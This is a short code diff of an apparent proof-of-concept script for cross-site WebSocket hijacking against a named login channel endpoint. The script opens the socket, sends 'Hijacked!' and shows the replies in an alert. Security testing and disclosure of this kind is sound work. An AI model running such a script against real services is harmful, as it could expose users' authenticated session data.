@@ -1,11 +1,10 @@
 <script>
-websocket = new WebSocket('wss://hub.yoti.com/channel/login')
-websocket.onopen = start
-websocket.onmessage = handleReply
-function start(event) {
-  websocket.send("READY");
+var webSocket = new WebSocket('wss://hub.yoti.com/channel/login');
+webSocket.onmessage = function(event) {
+    alert(event.data);
 }
-function handleReply(event) {
-  alert(event.data);
+webSocket.onopen = function(event) {
+    webSocket.send('Hijacked!')
 }
+
 </script>
